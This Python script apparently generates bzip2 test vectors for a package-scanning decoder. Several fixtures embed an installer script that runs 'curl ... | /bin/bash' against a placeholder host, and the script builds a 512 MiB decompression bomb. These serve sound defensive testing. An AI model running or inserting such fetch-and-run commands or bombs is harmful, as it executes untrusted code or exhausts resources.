#!/usr/bin/env python3
"""Regenerate the differential bzip2 vectors under crates/nav-core/testdata/bzip2/.

Ground truth comes from CPython's bz2 (i.e. real libbz2), so nav-core's
hand-rolled decoder is checked against a reference implementation rather
than against itself. Deterministic: the RNG is seeded.

Each case pairs <name>.in (bzip2 stream) with <name>.out (expected plaintext).
level_N.in (N=1..9) have no .out of their own: they all decode to text.out.
The randomised_* vectors are static, not regenerated here: each is a real
stream with the randomised flag set, libbz2's decoded output taken as the
expectation, and the block and stream CRCs patched to match.
bomb.in deliberately has no .out - it must be rejected as BudgetExceeded.

Usage: python3 generate.py <output-dir>
"""
import bz2, os, random, sys

def bits_of(data, start_bit, n):
    v = 0
    for i in range(start_bit, start_bit + n):
        v = (v << 1) | ((data[i // 8] >> (7 - i % 8)) & 1)
    return v

def first_block_groups(comp):
    """nGroups of the first block, parsed from the stream (asserts the vectors
    named *_groups* really exercise 2 and 6 Huffman tables)."""
    p = 32 + 48 + 32 + 1 + 24          # header, magic, crc, randomised, origPtr
    ranges = bits_of(comp, p, 16); p += 16
    for i in range(16):
        if (ranges >> (15 - i)) & 1:
            p += 16
    return bits_of(comp, p, 3)

def build():
    random.seed(20260904)
    c = {}
    def add(name, plain, level=9):
        c[name] = (plain, bz2.compress(plain, level))

    add("empty", b"")
    add("one_byte", b"x")
    add("hello", b"hello")

    words = ["package", "install", "script", "distribution", "signature",
             "payload", "bundle", "launchd", "entropy", "notarized"]
    text = (" ".join(random.choice(words) for _ in range(4000))).encode()
    add("text", text)
    for lvl in range(1, 10):
        c[f"level_{lvl}"] = (None, bz2.compress(text, lvl))

    rnd = bytes(random.getrandbits(8) for _ in range(4096))
    add("all_bytes", bytes(range(256)))

    # RLE1 boundaries: a run of 4 is followed by a count byte (0..=255).
    for n in (4, 5, 259, 260, 1000):
        add(f"run_{n}", b"A" * n)
    add("run_4_then_other", b"AAAAB" + b"CCCCC" + b"AAAA")
    add("run_255_plus_4", b"Z" * (255 + 4))

    # An installer Distribution as the xar/package rule tests use it.
    add("distribution_dropper",
        b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
        b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')

    # Dropper Distribution followed by 5 MiB of newlines: a ~250 byte stream
    # that exceeds any entry budget (nothing committed for the output).
    dist = (b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
            b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')
    c["distribution_big"] = (None, bz2.compress(dist + b"\n" * (5 << 20)))
    # Same, then junk that is not well-formed XML after the whitespace.
    add("distribution_junk_tail", dist + b"\n" * 400 + b"<" * 3000)

    # The benign counterpart (the installer_distribution_js_ordinary fixture's).
    add("distribution_ordinary", (
        b'<?xml version="1.0" encoding="utf-8" standalone="yes"?>\n'
        b'<installer-gui-script minSpecVersion="1">\n'
        b'    <title>Example App</title>\n'
        b'    <options customize="allow" rootVolumeOnly="true"/>\n'
        b'    <script>\n'
        b'    function onConclusion() {\n'
        b"        system.run('unload.sh');\n"
        b'    }\n'
        b'    </script>\n'
        b'    <choices-outline>\n'
        b'        <line choice="default"/>\n'
        b'    </choices-outline>\n'
        b'    <choice id="default" title="Example App" selected="system.compareVersions(system.version.ProductVersion, \'10.9\') &lt; 1">\n'
        b'        <pkg-ref id="invalid.example.navtest"/>\n'
        b'    </choice>\n'
        b'    <conclusion file="conclusion.html" onConclusionScript="onConclusion()"/>\n'
        b'    <pkg-ref id="invalid.example.navtest" version="1" installKBytes="1" updateKBytes="0">#component.pkg</pkg-ref>\n'
        b'    <pkg-ref id="invalid.example.navtest">\n'
        b'        <bundle-version/>\n'
        b'    </pkg-ref>\n'
        b'</installer-gui-script>'
    ))

    add("zeros_64k", b"\x00" * 65536)

    # ~250 KB of low-entropy bytes at level 1 -> 3 blocks.
    multi = bytes(random.choice(b"abcdefghijklmnop") for _ in range(250000))
    add("multi_block", multi, 1)

    # A 300-byte run straddling the first block boundary (level 1 holds
    # ~99.98 KB of RLE1 output per block).
    cross = (bytes(random.getrandbits(8) for _ in range(99978))
             + b"x" * 300
             + bytes(random.getrandbits(8) for _ in range(1000)))
    add("run_cross_block", cross, 1)

    # libbz2 picks the group count from the symbol count: <200 -> 2, >=2400 -> 6.
    add("groups_2", b"hello hello hello")
    assert first_block_groups(c["groups_2"][1]) == 2
    add("groups_6", rnd)
    assert first_block_groups(c["groups_6"][1]) == 6
    return c

if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "."
    os.makedirs(out, exist_ok=True)
    for name, (plain, comp) in build().items():
        open(os.path.join(out, name + ".in"), "wb").write(comp)
        if plain is not None:
            open(os.path.join(out, name + ".out"), "wb").write(plain)
        print(f"{name:18s} in={len(comp):7d} out={len(plain) if plain is not None else -1:7d}")

    # 512 MiB of zeros from a few hundred bytes. No .out on purpose.
    co = bz2.BZ2Compressor(9)
    chunk = b"\x00" * (1 << 20)
    bomb = b"".join(co.compress(chunk) for _ in range(512)) + co.flush()
    open(os.path.join(out, "bomb.in"), "wb").write(bomb)
    print(f"{'bomb':18s} in={len(bomb):7d} (no .out: BudgetExceeded)")
